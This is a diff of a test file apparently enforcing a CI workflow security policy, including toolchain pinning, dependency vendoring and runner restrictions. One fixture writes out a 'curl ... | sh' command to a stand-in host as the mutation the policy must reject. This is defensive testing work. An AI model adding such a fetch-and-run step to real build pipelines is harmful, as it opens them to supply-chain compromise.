@@ -148,11 +148,12 @@ describe("workflow security policy", () => {
         "release-validation must reject fork-controlled branches before using the self-hosted runner",
     },
     {
-      name: "rejects a moving Rust toolchain",
+      name: "rejects reintroducing Krusty source vendoring",
       workflow: "ci.yml",
-      search: "toolchain: 1.96.1",
-      replacement: "toolchain: stable",
-      failure: ".github/workflows/ci.yml must pin Rust toolchain 1.96.1",
+      search: "      - run: bun run vendor:argent",
+      replacement: "      - run: bun run vendor:krusty\n      - run: bun run vendor:argent",
+      failure:
+        ".github/workflows/ci.yml must consume the pinned published Krusty package instead of vendoring source",
     },
     {
       name: "rejects exposing the Chromatic token to the whole UI job",
@@ -179,10 +180,10 @@ describe("workflow security policy", () => {
       failure: ".github/workflows/release-build.yml must vendor the pinned privacy SDK",
     },
     {
-      name: "rejects vendoring Krusty without the Argent contracts",
+      name: "rejects privacy vendoring without the Argent contracts",
       workflow: "nightly.yml",
-      search: "bun run vendor:krusty && bun run vendor:argent && bun run vendor:privacy",
-      replacement: "bun run vendor:krusty && bun run vendor:privacy",
+      search: "bun run vendor:argent && bun run vendor:privacy",
+      replacement: "bun run vendor:privacy",
       failure: ".github/workflows/nightly.yml must verify the pinned Argent account contracts",
     },
     {
@@ -207,9 +208,9 @@ describe("workflow security policy", () => {
     {
       name: "rejects a downloaded installer piped into a shell during vendoring",
       workflow: "release-build.yml",
-      search: "      - run: bun run vendor:krusty",
+      search: "      - run: bun run vendor:privacy",
       replacement:
-        "      - run: curl -sSf https://example.invalid/i.sh | sh\n      - run: bun run vendor:krusty",
+        "      - run: curl -sSf https://example.invalid/i.sh | sh\n      - run: bun run vendor:privacy",
       failure:
         ".github/workflows/release-build.yml must not run `curl -sSf https://example.invalid/i.sh | sh`: it pipes a downloaded script straight into a shell",
     },
